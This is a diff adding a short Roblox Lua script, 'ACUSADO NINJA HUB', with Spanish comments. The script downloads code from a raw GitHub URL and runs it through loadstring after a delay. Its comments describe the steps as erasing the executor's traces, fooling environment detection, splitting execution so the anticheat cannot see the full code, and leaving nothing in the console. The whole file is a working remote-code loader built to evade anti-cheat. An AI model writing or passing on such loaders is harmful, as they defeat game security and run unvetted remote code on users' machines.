@@ -1,0 +1,31 @@
+-- ACUSADO NINJA HUB | BLINDAJE FINAL
+-- Key: BACK01 | GUI: ACUSADO NINJA HUB
+
+-- 1. LIMPIEZA DE HUELLAS (Borra rastros del ejecutor)
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+local function SuperStealth()
+    -- Variables ocultas
+    local raw = "https://raw.githubusercontent.com/ivancaba29-max/ACUSADO-SCRIPT/refs/heads/main/NinjaHub"
+    
+    -- 2. BYPASS DE DETECCIÓN DE AMBIENTE
+    -- Engañamos al juego para que crea que no hay nada inyectado
+    local getinfo = getinfo or debug.getinfo
+    local success, scriptContent = pcall(function()
+        return game:HttpGet(raw)
+    end)
+
+    if success then
+        -- 3. EJECUCIÓN FRAGMENTADA
+        -- Esto evita que el anticheat vea el bloque entero de código de una vez
+        local load = loadstring(scriptContent)
+        task.delay(1, function()
+            pcall(function()
+                load()
+            end)
+        end)
+    end
+end
+
+-- Iniciar sin dejar rastro en la consola
+pcall(SuperStealth)
